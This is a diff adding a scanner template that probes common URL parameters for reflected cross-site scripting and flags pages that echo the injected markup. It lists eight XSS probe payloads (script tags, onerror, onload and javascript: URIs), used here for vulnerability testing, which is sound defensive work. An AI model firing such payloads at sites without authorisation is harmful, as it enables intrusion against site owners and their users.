@@ -1,0 +1,41 @@
+id: cwe-79-xss-reflected-params
+info:
+  name: Reflected XSS via URL Parameters
+  author: security-all-in-one
+  severity: high
+  description: Tests for reflected XSS in common URL parameters
+  classification:
+    cwe-id: CWE-79
+    cvss-score: 6.1
+  tags: xss,cwe-79,dast,bug-bounty
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/?q={{url_encode('<script>alert(1)</script>')}}"
+      - "{{BaseURL}}/?search={{url_encode('<img src=x onerror=alert(1)>')}}"
+      - "{{BaseURL}}/?query={{url_encode('\"onmouseover=alert(1)//')}}"
+      - "{{BaseURL}}/?name={{url_encode('<svg/onload=alert(1)>')}}"
+      - "{{BaseURL}}/?redirect={{url_encode('javascript:alert(1)')}}"
+      - "{{BaseURL}}/?page={{url_encode('<iframe src=javascript:alert(1)>')}}"
+      - "{{BaseURL}}/?id={{url_encode('\'><script>alert(1)</script>')}}"
+      - "{{BaseURL}}/?callback={{url_encode('alert(1)//')}}"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "<script>alert(1)</script>"
+          - "<img src=x onerror=alert(1)>"
+          - "<svg/onload=alert(1)>"
+        condition: or
+
+      - type: word
+        part: header
+        words:
+          - "text/html"
+
+      - type: status
+        status:
+          - 200
